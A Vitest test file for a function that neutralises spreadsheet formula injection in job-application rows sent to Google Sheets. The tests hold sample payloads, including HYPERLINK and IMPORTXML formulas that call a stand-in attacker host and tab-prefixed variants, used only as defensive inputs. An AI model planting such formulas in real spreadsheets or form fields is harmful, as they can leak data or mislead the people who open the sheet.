import { describe, expect, it } from 'vitest';
import { sanitizeSheetCell } from './applicationsSheet';

/*
  The row is appended with valueInputOption=USER_ENTERED, so a cell Sheets
  would parse as a formula has to arrive quoted. `referredBy` is the one an
  attacker reaches directly, through `?ref=` on the public apply page.
*/
describe('sanitizeSheetCell', () => {
  it('quotes the four formula lead characters', () => {
    expect(sanitizeSheetCell('=HYPERLINK("http://evil.test","W2")')).toBe(
      '\'=HYPERLINK("http://evil.test","W2")'
    );
    expect(sanitizeSheetCell('+1+1')).toBe("'+1+1");
    expect(sanitizeSheetCell('-2+3')).toBe("'-2+3");
    expect(sanitizeSheetCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
  });

  it('quotes a leading tab or carriage return, which Sheets skips before parsing', () => {
    expect(sanitizeSheetCell('\t=IMPORTXML("http://evil.test","//x")')).toBe(
      '\'\t=IMPORTXML("http://evil.test","//x")'
    );
    expect(sanitizeSheetCell('\r=1+1')).toBe("'\r=1+1");
  });

  it('leaves an ordinary value exactly as it was', () => {
    expect(sanitizeSheetCell('Jane Rep')).toBe('Jane Rep');
    expect(sanitizeSheetCell('555-0100')).toBe('555-0100');
    expect(sanitizeSheetCell('jane@example.com')).toBe('jane@example.com');
    expect(sanitizeSheetCell('9/21/2026, 3:04:05 PM')).toBe('9/21/2026, 3:04:05 PM');
    expect(sanitizeSheetCell('')).toBe('');
  });

  it('only ever adds one quote, so a sanitised value is stable', () => {
    expect(sanitizeSheetCell(sanitizeSheetCell('=1+1'))).toBe("'=1+1");
  });

  it('does not touch a formula character that is not first', () => {
    expect(sanitizeSheetCell('Referred by A=B')).toBe('Referred by A=B');
    expect(sanitizeSheetCell('Manager (ext -4)')).toBe('Manager (ext -4)');
  });
});
